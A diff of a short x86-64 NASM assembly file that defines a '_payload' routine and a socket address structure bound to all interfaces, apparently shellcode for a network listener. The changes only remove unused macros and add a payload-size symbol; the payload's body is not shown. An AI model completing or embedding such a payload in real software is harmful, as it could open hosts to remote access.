@@ -1,24 +1,8 @@
 [BITS 64]
 
-global _payload
-global _payload_size
-
-%macro pushx 1-*
-%rep %0
-	push %1
-	%rotate 1
-%endrep
-%endmacro
-
-%macro popx 1-*
-%rep %0
-	%rotate -1
-	pop %1
-%endrep
-%endmacro
-
 section .text
 global _payload
+global _payload_size
 
 _payload:
     push rbp
@@ -106,3 +90,4 @@ sockaddr_in:
 	dd 0                       ; sin_addr (INADDR_ANY)
 	times 8 db 0               ; sin_zero (8 octets de zéros)
 	; Taille totale: 16 octets
+_payload_size equ $ - _payload
